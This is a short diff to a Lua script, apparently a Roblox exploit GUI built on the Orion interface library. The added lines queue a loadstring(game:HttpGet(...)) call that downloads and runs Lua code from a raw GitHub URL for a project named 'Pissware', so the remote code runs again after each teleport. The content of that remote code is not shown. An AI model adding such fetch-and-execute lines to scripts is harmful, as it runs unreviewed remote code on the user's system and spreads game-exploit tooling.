@@ -463,3 +463,7 @@ beta:AddParagraph(
 )
 
 Orion:Init()
+
+queuetp[[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnAvaragelilmemer/Pissware/main/Main/main.lua"))()
+]]
